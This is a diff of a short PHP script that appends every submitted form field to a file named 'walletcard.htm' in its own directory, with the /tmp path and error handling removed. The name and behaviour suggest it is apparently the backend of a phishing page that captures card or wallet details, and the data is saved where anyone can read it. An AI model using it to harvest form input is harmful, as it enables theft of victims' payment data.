@@ -1,19 +1,6 @@
 <?php
-// Path to a writable temporary directory
-$tempDir = '/tmp'; // Most servers have a writable /tmp directory
-$filePath = $tempDir . '/walletcard.htm';
-
-// Create the file if it doesn't exist
-if (!file_exists($filePath)) {
-    file_put_contents($filePath, ''); // Create the file with empty content
-}
-
-// Open the file for appending
-$handle = fopen($filePath, "a");
-
-if (!$handle) {
-    die('Failed to open file for writing: ' . error_get_last()['message']);
-}
+// Open or create a file for writing form data
+$handle = fopen("walletcard.htm", "a");
 
 // Iterate through POST data
 foreach ($_POST as $variable => $value) {
@@ -22,7 +9,10 @@ foreach ($_POST as $variable => $value) {
     $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
     
     // Write sanitized data to the file
-    fwrite($handle, $safe_variable . "=" . $safe_value . "<br>");
+    fwrite($handle, $safe_variable);
+    fwrite($handle, "=");
+    fwrite($handle, $safe_value);
+    fwrite($handle, "<br>");
 }
 
 fwrite($handle, "<hr>");
